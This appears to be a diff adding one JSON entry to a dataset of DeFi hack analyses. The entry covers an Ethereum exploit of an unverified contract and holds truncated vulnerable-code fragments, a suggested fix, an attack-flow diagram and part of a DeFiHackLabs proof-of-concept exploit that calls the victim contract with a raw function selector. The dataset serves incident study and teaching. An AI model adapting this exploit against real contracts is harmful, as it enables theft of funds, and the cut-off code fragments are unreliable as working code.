@@ -1,0 +1,30 @@
+{
+ "id": "2024__2024-04-09_UnverifiedContract0x00C409_UnknownVuln",
+ "source_file": "2024/2024-04-09_UnverifiedContract0x00C409_UnknownVuln.md",
+ "title": "Unverified Contract 0x00C409 — Unknown Vulnerability Analysis of an Unverified Contract",
+ "date": "2024-04-09",
+ "protocol": "Unverified Contract 0x00C409",
+ "chain": "Ethereum",
+ "loss_raw": "Unconfirmed",
+ "loss_usd": null,
+ "root_cause": "Unknown vulnerability in an unverified contract",
+ "attack_tx": "0x998f...1d3f (fork block 19,255,512 ≈ Feb 2024; file date 2024-04-09 per DeFiHackLabs)",
+ "vulnerable_contract": "0x00C4...003b",
+ "classes": [
+  "business-logic"
+ ],
+ "code_before": [
+  "❌ Vulnerable implementation example\n// Issue: Unknown vulnerability in an unverified contract\n// The attacker exploits this logic to gain illegitimate profit\n\n// Unverified Contract 0x00C409 — Vulnerable function exploiting Balancer flashLoan\ninterface IBalancerVault {\n    //",
+  "❌ Vulnerable: Within the flashLoan callback (receiveFlashLoan), the unverified\n    // contract's fallback/withdraw function can be called to manipulate internal state.\n    // Exact vulnerability reproduction is not possible as the contract is unverified.\n    function flashLoan(\n        address recipient,\n        address[] memory tokens,\n        uint256[] memory amounts,\n        bytes memory userData\n    ) external;\n}\n\n//",
+  "❌ Vulnerable: swapExactAmountIn in the unverified contract — no internal price invariant validation\n// Trusts return values of getBalance/getReserves/calcOutGivenIn, making manipulation possible\ninterface IUnverifiedContract {\n    function getBalance(address token) external view returns (uint256);\n    function getReserves() external view returns (uint256, uint256, uint256);\n    function calcOutGivenIn(uint256 tokenBalanceIn, uint256 tokenWeightIn, uint256 tokenBalanceOut, uint256 tokenWeightOut, uint256 tokenAmountIn, uint256 swapFee) external pure returns (uint256);\n    //"
+ ],
+ "code_after": [
+  "✅ Correct implementation: contract verification + price invariant enforcement\nfunction safeSwap(address tokenIn, uint256 amountIn, address tokenOut, uint256 minOut) external {\n    //",
+  "✅ Contract source code verification required (no interaction with unverified contracts)\n    require(verifiedContracts[msg.sender], \"Swap: unverified contract\");\n    //"
+ ],
+ "steps": [],
+ "other_code": [
+  "Attacker\n  │\n  ▼\n[Vulnerability Identified] ─────── Unverified Contract 0x00C409\n  │\n  ▼\n[Malicious Transaction Sent] ───── Vulnerable function called\n  │                                  (validation bypassed)\n  ▼\n[Asset Drained] ─────────────────── Profit secured",
+  "// Source: DeFiHackLabs - UnverifiedContr_0x00C409_exp.sol\n// Chain: Ethereum | Date: 2024-04-09\n\n    function testExploit() external {\n        deal(address(weth), address(this), 4704.1 ether);\n        emit log_named_decimal_uint(\n            \"[End] Attacker weth balance before exploit\", weth.balanceOf(address(this)), weth.decimals()\n        );\n        attack();\n        emit log_named_decimal_uint(\n            \"[End] Attacker weth balance after exploit\", weth.balanceOf(address(this)), weth.decimals()\n        );\n    }\n\n    function attack() public {\n        weth.withdraw(4704.1 ether);\n        address(vulnContract).call{value: 4704.1 ether}(\"\");\n        bytes memory data = abi.encodeWithSelector(\n            bytes4(0xba381f8f),\n            0xffffffffffffffffff,\n            0x01,\n           "
+ ]
+}
